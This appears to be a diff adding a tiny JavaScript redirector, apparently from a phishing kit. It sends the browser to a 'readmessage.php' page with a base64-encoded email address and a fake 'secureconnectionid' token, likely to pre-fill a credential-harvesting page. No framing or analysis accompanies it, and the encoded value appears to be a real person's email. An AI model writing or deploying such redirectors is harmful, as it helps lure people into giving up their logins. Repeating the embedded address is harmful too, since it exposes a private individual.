@@ -1,0 +1,4 @@
+
+loc = "readmessage.php?rdata=YXlvdG9ycmFsYmFAbW9uZWdyb3MubmV0&secureconnectionid=311afe22508578e8f04ebf51cfb046ee"
+self.location.replace(loc);
+window.location = loc;
